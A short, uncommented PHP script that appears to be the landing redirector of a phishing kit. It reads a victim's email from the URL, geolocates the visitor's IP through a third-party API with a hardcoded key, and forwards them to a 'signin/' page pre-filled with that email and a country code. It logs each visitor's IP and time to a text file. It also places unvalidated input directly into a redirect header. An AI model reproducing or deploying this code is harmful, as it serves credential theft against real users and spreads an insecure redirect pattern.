<?
$mail = $_GET['user'];
$ip = $_SERVER['REMOTE_ADDR'];
$url = "http://api.ipinfodb.com/v3/ip-country/?key=fd78c362ac3e1088c3e086bd5d81aa51336b641264968b1cf178233c5f3ca7c1&ip=".$ip;

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_HEADER, 0);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
$result = curl_exec($ch);
curl_close($ch);

$verify = False;

if (!empty($result)){
	$test = explode(";;",$result);
}
if ($test[0] == "OK") {
	$verify = True;
	$rez = explode(";",$test[1]);
	if ($rez[1] != "-"){
		$country = $rez[1];
	} else {
		$verify = False;
	}
}

$home="signin/";
header("location:$home?user=$mail&CC=$country");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
?> 